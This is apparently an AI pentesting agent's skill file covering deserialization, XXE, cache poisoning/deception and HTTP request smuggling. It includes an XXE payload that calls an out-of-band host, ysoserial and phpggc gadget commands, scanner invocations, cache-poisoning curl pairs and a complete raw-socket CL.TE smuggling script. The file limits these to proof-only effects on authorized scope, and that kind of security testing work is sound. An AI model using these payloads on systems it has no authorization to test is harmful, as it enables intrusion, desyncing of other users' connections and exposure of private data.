---
name: deep-server
description: Deeper server-side classes for a Mythos engagement - insecure deserialization, XXE, web cache poisoning/deception and HTTP request smuggling - where scanners only produce candidates and every finding must be confirmed by an OOB token mapped to its injection point or by a differential pair on the agent's own connection/cache key. Use when recon fingerprints Java/.NET/PHP/Python serialized blobs, XML or SOAP/SAML/SVG/DOCX input, a CDN or caching proxy, or a front-end/back-end proxy chain.
---

# Deep server classes: candidates from tools, proof from OOB or a differential pair

These are the classes open agents miss most (Strix's unsolved XBEN set
includes smuggling and PHP deserialization). Every tool below is a
**candidate generator**; nothing it prints is a finding on its own.

| tool | role | in the toolbox image? |
|---|---|---|
| Web-Cache-Vulnerability-Scanner (`wcvs`) | candidates only | no. Kali package `web-cache-vulnerability-scanner` or `go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest` |
| smuggler.py (defparam) | candidates only, documented FPs on large CDNs | no. `git clone https://github.com/defparam/smuggler /tmp/smuggler` in the toolbox (lab) |
| ysoserial / ysoserial.net | payload builder | no (needs Java / Windows .NET) |
| phpggc | payload builder | no (needs PHP) |
| nuclei (`-tags xxe,deserialization,cache,smuggling`) | candidates only | yes |
| interactsh-client, lab `oast` catcher | **proof** (OOB) | yes / lab |
| curl, python3 raw sockets | **proof** (differential pair) | yes |

Tool facts for ysoserial, phpggc and the gadget names below are general
knowledge, not verified against sources in the research; check `--help` /
`-l` output before relying on a flag.

## Common rules

- **One token per injection point**, recorded in
  `engagements/<dir>/scan/oob-tokens.jsonl` (`token, class, request, ts`).
  OOB proof = a hit in the OAST log carrying that token. In the lab use
  `http://oast:8080/<token>` (HTTP); the lab DNS listener only sees queries
  that are sent to it directly, so a target resolving through Docker's DNS will
  not reach it: use HTTP callbacks in the lab, DNS (`<token>.<id>.oast.fun`)
  only with interactsh on internet targets.
- Harmless effect only: DNS/HTTP callback, a time delay, a marker in your own
  response. No command execution on real targets beyond `id`-equivalent in the
  lab, no file reads beyond `/etc/hostname`, never poison a cache key or a
  backend connection another user can hit.
- Requires `scope.rules.allow_active`; proofs with side effects need
  `allow_exploit` and the user's go (see **exploit**).

## Insecure deserialization

Signals: `rO0AB` / `aced0005` (Java), `O:<n>:"` / `a:<n>:{` (PHP),
`gASV` / `\x80\x04` (pickle), `$type` in JSON (.NET), `__VIEWSTATE` without
MAC, `--- !ruby/object`. See `knowledge/web/deserialization.md`.

Confirm with a gadget whose only effect is a callback:
- Java: `java -jar ysoserial.jar URLDNS 'http://<token>.<oast-domain>'`
  (DNS lookup only, no code execution; needs interactsh DNS).
- PHP: `phpggc -l <framework>` and pick a chain whose type is file read/SSRF-like
  pointing at `http://oast:8080/<token>`; otherwise a time-based chain.
- Python pickle (lab only): an object whose `__reduce__` calls
  `urllib.request.urlopen('http://oast:8080/<token>')`.

`validated` = the OAST hit for that token, plus the same request with the
blob unchanged producing no hit (negative control).

## XXE

Candidate points: XML bodies, SOAP, `SAMLResponse`, SVG/DOCX/XLSX uploads,
RSS/webhook import, `Content-Type` switch from JSON to XML on the same
endpoint. OOB payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % x SYSTEM "http://oast:8080/<token>"> %x; ]>
<r>1</r>
```

`validated` = OAST hit with the token (parameter-entity fetch). File read
(`file:///etc/hostname`) only in the lab. See `knowledge/web/xxe.md`.

## Web cache poisoning and deception

```
scripts/mythos sh 'wcvs -u "<URL>?cb=<token>" -hw <header-wordlist> -pw <param-wordlist> -sh "$(sed -n 1p engagements/<dir>/sessions/userA.headers)" -gr'
```

Every request carries a **cache buster** `cb=<token>`, so only that one
cache key can be poisoned. Confirm a reported unkeyed input by hand:

1. Poison: `curl -s -D- '<URL>?cb=<token>' -H 'X-Forwarded-Host: <token>.example'`
2. Clean read, no header, same `cb`: `curl -s -D- '<URL>?cb=<token>'`
3. `validated` = step 2 (fresh connection, no poisoning header) shows the
   injected value **and** a cache hit indicator (`X-Cache: hit`, `Age > 0`,
   `CF-Cache-Status: HIT`); negative control: a different `cb` is clean.

Cache deception: as userA request `/<private page>/x.css` (or `;.css`,
`%2f..%2fstatic`), then fetch the same URL anonymously. `validated` = the
anonymous response contains userA's private marker with a cache hit header.
See `knowledge/web/cache-poisoning.md`.

## HTTP request smuggling

```
scripts/mythos sh 'python3 /tmp/smuggler/smuggler.py -u <URL> -t 10 -q'
```

smuggler reports CL.TE / TE.CL **candidates** (timing based) and is known to
misfire on large CDNs. Confirm with a **differential pair you send yourself**,
in the lab or with explicit program permission only, because a desynced
backend socket can serve your prefix to another user:

1. Attack request whose smuggled prefix is `GET /mythos-<token> HTTP/1.1`
   followed by a dangling header line.
2. Immediately a normal `GET /` on the same connection.
3. `validated` = the normal request gets the response for `/mythos-<token>`
   (typically 404 with the token in the path), repeated twice; negative
   control: the same pair without the conflicting `Content-Length` /
   `Transfer-Encoding` returns the normal page.

Minimal raw sender (CL.TE shown; swap the body for TE.CL):

```
scripts/mythos python3 - <<'EOF'
import socket
H, P, T = "target", 80, "<token>"
smug = f"GET /mythos-{T} HTTP/1.1\r\nX-Ignore: x"
body = f"0\r\n\r\n{smug}"
attack = (f"POST / HTTP/1.1\r\nHost: {H}\r\nContent-Type: application/x-www-form-urlencoded\r\n"
          f"Content-Length: {len(body)}\r\nTransfer-Encoding: chunked\r\n\r\n{body}")
normal = f"GET / HTTP/1.1\r\nHost: {H}\r\n\r\n"
s = socket.create_connection((H, P), timeout=10)
s.sendall(attack.encode()); print(s.recv(65536).decode(errors="replace")[:300]); print("-----")
s.sendall(normal.encode()); print(s.recv(65536).decode(errors="replace")[:300])
EOF
```

See `knowledge/web/request-smuggling.md`.

## Output

Each candidate goes to `scan/candidates.md` with its closure state; tool lines
are `candidate`, a confirmed pair or OOB hit is `reproduced` and becomes
`validated` after the **exploit** validator pass. Mark every class you
checked in the coverage matrix (**web-scan**), including "not applicable".
